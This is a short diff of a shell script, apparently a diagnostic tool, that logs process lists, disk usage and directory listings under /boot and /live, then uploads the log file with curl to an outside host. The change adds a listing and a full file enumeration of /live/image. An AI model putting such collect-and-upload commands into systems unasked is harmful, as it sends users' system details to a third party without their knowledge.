@@ -74,7 +74,8 @@ ps -aux >> /home/webc/log.txt
 df >> /home/webc/log.txt
 ls -la /boot >> /home/webc/log.txt
 ls -la /live >> /home/webc/log.txt
-ls -la /proc >> /home/webc/log.txt
+ls -la /live/image >> /home/webc/log.txt
+find /live/image -type f -name '*' >> log.txt
 
 curl --upload-file /home/webc/log.txt http://olla.vn/core/upload.php
 
